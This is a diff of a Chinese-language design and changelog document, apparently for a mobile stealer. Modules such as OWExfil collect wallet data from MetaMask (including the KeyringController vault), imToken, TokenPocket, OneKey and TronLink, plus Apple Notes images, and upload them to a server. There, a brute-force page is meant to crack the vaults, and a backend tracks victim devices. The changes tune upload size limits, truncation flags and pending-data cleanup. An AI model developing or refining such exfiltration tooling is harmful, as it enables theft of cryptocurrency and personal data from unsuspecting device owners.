@@ -643,7 +643,10 @@ B: TokenPocket 完成（0.1s）
 | **收尾互斥** | `OWRoute._finalizing` | 主流程收尾与补传回调不会同时写 done |
 | **realm 按二进制扫** | `OWExtractor._scanFile` | 之前把 `.realm` 当 sqlite 打开必失败并静默返回；改为扫可打印串，OneKey 等兜底场景能捞地址 |
 | **imToken 减包** | `targets.plist` | 去掉 `default.realm`（3MB，只含 10 ETH/20 BTC，423 个地址都在 RCT 存储里），包 2.01MB → 120KB |
-| **MetaMask 减包** | `targets.plist` excludes | 排除 Snap 插件 JS（bitcoin/tron/stellar/solana/ens 约 2.5MB），保留 `persist-KeyringController` vault（**注意：服务端素材扫描要求 `.json`，见 §15 #1**） |
+| **MetaMask 减包** | `targets.plist` excludes | 排除 Snap 插件 JS（bitcoin/tron/stellar/solana/ens 约 2.5MB），保留 `persist-KeyringController` vault（服务端 `.json` 限制已由服务端修复） |
+| **单目标上限可覆盖** | `targets.plist` 的 `maxBytes` + `OWContainerPass._collectTarget` | AppleNotes 提到 300MB；未配置时仍 150MB |
+| **zip 截断不再静默** | `OWRoute._uploadContainerResult` | 打包前算目录总字节，超上限时 `_manifest.json` 写 `truncated:true` + `droppedBytes` |
+| **pending 清理阈值统一** | `OWExfil` 的 `OWMaxPendingItemBytes` | 由 500MB 常量统一，不再和 `maxContainerBytes` 两处写死 |
 
 ### 14.2 部分实现 / 未实现 ⚠️❌
 
@@ -687,8 +690,8 @@ B: TokenPocket 完成（0.1s）
 |---|---|---|---|
 | 1 | **MetaMask vault 无 `.json` 后缀**：服务端 `keyringcontroller`/`vault` 两条规则都要求 `.json` 结尾 | 素材扫描不把 `persist-KeyringController` 归到 metamask，爆破页可能拿不到 vault（地址仍能解析） | 客户端额外落一份 `persist-KeyringController.json` 副本；或服务端去掉 `.json` 要求 |
 | 2 | Discovery 数据源在 `/var/mobile/Library/…`（LastLaunchServicesMap.plist / applicationState.db） | MHA 沙箱大概率读不到 → `Discovery 已安装 0 个 App`，TronLink 仍会漏 | 下次真机日志确认；读不到就退回「补 bundleId 变体」 |
-| 3 | Notes 图片受 `_maxContainerBytes=150MB` 与 zip `totalCap=150MB` 双限制 | 图特别多时尾部文件被静默截断（只有日志 oversize 提示） | 给 Notes 单独提高上限，或在 `_manifest.json` 标 `truncated:true` |
-| 4 | `_cleanupOrphans` 的 250MB 阈值与 `maxContainerBytes` 两处独立写死 | 调大单包上限会静默丢旧 pending | 阈值改为由 `maxContainerBytes` 推导 |
+| 3 | ~~Notes 图片受 150MB 双限制~~ | ✅ 已修：AppleNotes `maxBytes=300MB`；超限时 `_manifest.json` 标 `truncated/droppedBytes` | — |
+| 4 | ~~250MB 阈值与 `maxContainerBytes` 两处写死~~ | ✅ 已修：统一为 `OWMaxPendingItemBytes = 500MB` | — |
 | 5 | `hasPendingData` 不含 `log` | 只剩日志没传时会先写 done | 保持现状（可接受） |
 | 6 | `up_` 标记在「上传成功→写状态」之间被杀会丢 | 下一轮重复上传一份 | 接受（宁重复不漏） |
 | 7 | 设备分裂 `web:` / `tok:` | 后台同设备显示两台 | 服务端合并为主 |
